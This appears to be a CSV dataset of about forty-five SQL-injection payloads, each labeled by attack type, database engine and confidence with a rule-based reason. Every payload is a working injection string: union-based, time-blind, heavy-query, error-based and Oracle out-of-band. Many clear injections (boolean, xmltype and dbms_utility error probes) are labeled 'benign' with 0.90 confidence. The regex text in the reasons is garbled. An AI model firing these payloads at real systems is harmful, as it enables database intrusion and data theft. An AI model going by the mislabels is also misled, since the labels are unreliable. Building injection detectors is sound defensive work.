id,payload_inner,sqli_type,db_engine,confidence,reasoning,sources_agree
24344,"-1333"" ) ) union all select 2376,2376,2376,2376,2376,2376,2376,2376,2376--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24345,1 ) as ktfu where 2637 = 2637,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24346,1'+ ( select nash where 4159 = 4159 union all select null#,union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24347,"1%"" ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ""%"" = """,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24348,"-8143 union all select 4492,4492,4492,4492,4492,4492,4492,4492,4492#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24349,"-9762 ) or elt ( 5773 = 8986,8986 )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24350,"1%' or 7417 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",heavy_query,db2,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24351,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( ( 'fnna' = 'fnna",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24352,select ( case when ( 7822 = 4430 ) then 7822 else 1/ ( select 0 ) end ) --,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24353,"1' ) ( select ( case when ( 5451 = 5451 ) then regexp_substring ( repeat ( right ( char ( 5451 ) ,0 ) ,500000000 ) ,null ) else char ( 108 ) ||char ( 76 ) ||char ( 112 ) ||char ( 116 ) end ) from information_schema.system_users )",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24354,"-9630%"" union all select 8592,8592,8592,8592--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24355,"1 and 6414 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 )",heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24356,"1"" ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( ""rtyu"" like ""rtyu",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24357,"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( '%' = '",time_blind,oracle,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
24358,( select * from ( select ( sleep ( 5 ) ) ) srmq ) and '%' = ',time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24359,"-3209'+ ( select ldum where 9912 = 9912 union all select 9912,9912,9912,9912#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24360,-8233' or 9538 = 1882#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24361,"-7125"" or ( 8919 = 2275 ) *2275 and ""fbwo"" = ""fbwo",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24362,"-4756"" ) ) union all select 6846,6846,6846,6846,6846,6846,6846#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24363,1' ) ) ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ( ( 'uzmy' like 'uzmy,time_blind,mysql,0.85,Signal match: sleep → time_blind (P5); DB signature: mysql,1
24364,"1"" ) ) as upvg where 4826 = 4826",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24365,1 ) ) as klmm where 3107 = 3107,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24366,1'|| ( select 'ptfi' from dual where 2234 = 2234 and 2006 = 2006,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24367,"1 ) where 8474 = 8474 or 5356 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24368,"-4413%' ) ) union all select 1345,1345#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24369,"1%"" ) ) ) and 1594 = 8757",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24370,"1"" ) ) union all select null,null,null,null,null,null,null,null,null,null--",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24371,"1', ( case when 3598 = 2118 then 1 else null end )",unknown,generic,0.50,Insufficient information to classify,1
24372,"-1004"" where 6266 = 6266 order by 1#",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24373,"-7043"" ) where 9755 = 9755 union all select 9755,9755,9755,9755,9755,9755#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24374,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ( ""%"" = """,heavy_query,firebird,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24375,1' ) as ghvi where 3880 = 3880 and 4595 = 4595#,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24376,1'|| ( select 'idna' from dual where 2683 = 2683 rlike ( select ( case when ( 3201 = 9748 ) then 1 else 0x28 end ) ) ) ||',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24377,"1 ) ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) and ( ( 8048 = 8048",heavy_query,generic,0.75,"Signal match: counts**s*) from [^,]+,s*[^,]+ → heavy_query (P6)",1
24378,"1"" ) ) as hbfi where 4773 = 4773 and 7756 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 7756 = 7756 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24379,-7435' ) where 6242 = 6242 or 4493 = utl_inaddr.get_host_address ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4493 = 4493 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) --,out_of_band,oracle,0.95,Signal match: utl_inaddr.get_host_address → out_of_band (P2),1
24380,1'+ ( select 'mzee' where 5984 = 5984,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24381,"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""kndm"" = ""kndm",time_blind,sqlite,0.85,Signal match: randomblob → time_blind (P5); DB signature: sqlite,1
24382,"1 ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,generic,0.85,Signal match: benchmark → time_blind (P5); confidence: 0.85,1
24383,"1"" where 7696 = 7696 and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) --",benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24384,"1 ) ) procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) and ( ( 3102 = 3102",error_based,generic,0.85,Signal match: extractvalue → error_based (P4); confidence: 0.85,1
24385,"-9718%"" ) union all select 9515,9515,9515#",union_based,generic,0.75,Signal match: union (all )?select → union_based (P7),1
24386,1 where 8966 = 8966,benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24387,1'|| ( select 'yhpe' where 8010 = 8010 rlike ( select ( case when ( 7910 = 3752 ) then 1 else 0x28 end ) ) ) ||',benign,generic,0.90,No attack signals detected; legitimate SQL structure,1
24388,"1"" where 3018 = 3018 or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) --",time_blind,generic,0.85,Signal match: dbms_pipe.receive_message → time_blind (P5),1
